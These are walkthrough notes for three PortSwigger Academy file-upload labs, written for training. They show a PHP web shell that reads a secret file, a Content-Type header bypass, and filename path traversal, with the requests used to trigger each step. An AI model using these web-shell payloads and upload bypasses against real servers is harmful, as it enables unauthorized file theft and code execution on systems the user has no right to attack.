# Lab 1: [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
- Login to the given account > Upload an image > Observe the Request & Response in HTTP History > Prepare a web-shell php file script > Upload it > Send the Get Request to Repeater > Change the path to your file.
- php file script `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Web shell File path: `GET /files/avatars/exploit.php HTTP/1.1`

> Web shell is a `malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests` to the right endpoint.
> A MIME type (also known as a Multipurpose Internet Mail Extension) is a standard that indicates the format of a file.


# Lab 2: [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
- Login to the given account > Upload an image > (It'll not allow) > Intercept the php File upload Request > Check the `Content-Type` header > Change its value to `image/jpeg` > Send the Request (It will allow this time)
- Observe the Request & Response in HTTP History >  Send the Get Request to Repeater > Change the path to your file. 

- php file script `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Web shell File path: `GET /files/avatars/exploit.php HTTP/1.1`

# Lab 3:
- Login to the given account > Upload an image > Observe the Request & Response in HTTP History > Prepare a web-shell php file script > Upload it > Send the Get Request to Repeater > Change the path to your file.
- php file script `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Web shell File path: `GET /files/avatars/exploit.php HTTP/1.1`

- This time the GET request will return the PHP file's content.
- Modify the `filename="../exploit.php"` in POST request of File Upload:
- ![image](https://github.com/user-attachments/assets/f5609d72-4ba5-4ec2-a68e-e5b0612ae81c)

- Observe the GET Request's response: Web shell File path: `GET /files/avatars/../exploit.php HTTP/1.1`
- ![image](https://github.com/user-attachments/assets/7b066cb1-a89a-4529-b7f4-a86762e0707b)









